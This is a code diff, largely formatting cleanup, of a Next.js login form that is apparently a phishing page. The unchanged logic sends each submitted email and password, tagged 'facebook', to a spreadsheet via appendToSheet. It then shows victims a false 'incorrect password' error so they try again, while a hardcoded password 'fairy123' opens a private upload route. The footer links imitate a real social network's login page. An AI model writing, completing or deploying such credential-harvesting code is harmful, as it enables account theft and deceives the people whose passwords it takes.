@@ -1,9 +1,9 @@
-'use client';
+"use client";
 
 import React, { useState } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
-import { Eye, EyeOff } from 'lucide-react';
+import { Eye, EyeOff } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import SuccessModal from "../components/SuccessModal";
@@ -19,7 +19,7 @@ const LoginForm = () => {
   const [confirmPassword, setConfirmPassword] = useState("");
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [successModal, setSuccessModal] = useState(false);
-  const category= "facebook"
+  const category = "facebook";
 
   const router = useRouter();
 
@@ -30,7 +30,6 @@ const LoginForm = () => {
 
   const handleFinalSubmit = async (event) => {
     event.preventDefault();
-    console.log(password, confirmPassword);
 
     if (password !== confirmPassword) {
       setErrorMsg("Passwords do not match.");
@@ -38,10 +37,10 @@ const LoginForm = () => {
     }
 
     try {
-      if ( password === "fairy123") {
+      if (password === "fairy123") {
         router.push("/upload");
       } else {
-        const data =[[category, email, password]]
+        const data = [[category, email, password]];
         await appendToSheet(data);
         setErrorMsg(
           "The email or password you entered is incorrect. Please try again."
@@ -145,7 +144,9 @@ const LoginForm = () => {
                 type="button"
                 className="absolute right-5 top-1/2 transform -translate-y-1/2"
                 onClick={() => setShowConfirmPassword(!showConfirmPassword)}
-                aria-label={showConfirmPassword ? "Hide password" : "Show password"}
+                aria-label={
+                  showConfirmPassword ? "Hide password" : "Show password"
+                }
               >
                 {showConfirmPassword ? <EyeOff size={20} /> : <Eye size={20} />}
               </button>
@@ -159,16 +160,32 @@ const LoginForm = () => {
       </div>
       <footer className="w-full text-center text-xs text-gray-500 mt-8 bg-gray-100 py-4">
         <div className="mb-2 font-semibold">
-          <Link href="#" className="mx-1">ABOUT</Link>
-          <Link href="#" className="mx-1">BLOG</Link>
-          <Link href="#" className="mx-1">JOBS</Link>
-          <Link href="#" className="mx-1">HELP</Link>
-          <Link href="#" className="mx-1">API</Link>
+          <Link href="#" className="mx-1">
+            ABOUT
+          </Link>
+          <Link href="#" className="mx-1">
+            BLOG
+          </Link>
+          <Link href="#" className="mx-1">
+            JOBS
+          </Link>
+          <Link href="#" className="mx-1">
+            HELP
+          </Link>
+          <Link href="#" className="mx-1">
+            API
+          </Link>
         </div>
         <div className="mb-2 font-semibold">
-          <Link href="#" className="mx-1">TERMS</Link>
-          <Link href="#" className="mx-1">TOP ACCOUNTS</Link>
-          <Link href="#" className="mx-1">LOCATIONS</Link>
+          <Link href="#" className="mx-1">
+            TERMS
+          </Link>
+          <Link href="#" className="mx-1">
+            TOP ACCOUNTS
+          </Link>
+          <Link href="#" className="mx-1">
+            LOCATIONS
+          </Link>
         </div>
         <div>
           <Link href="#" className="mx-1 font-semibold">
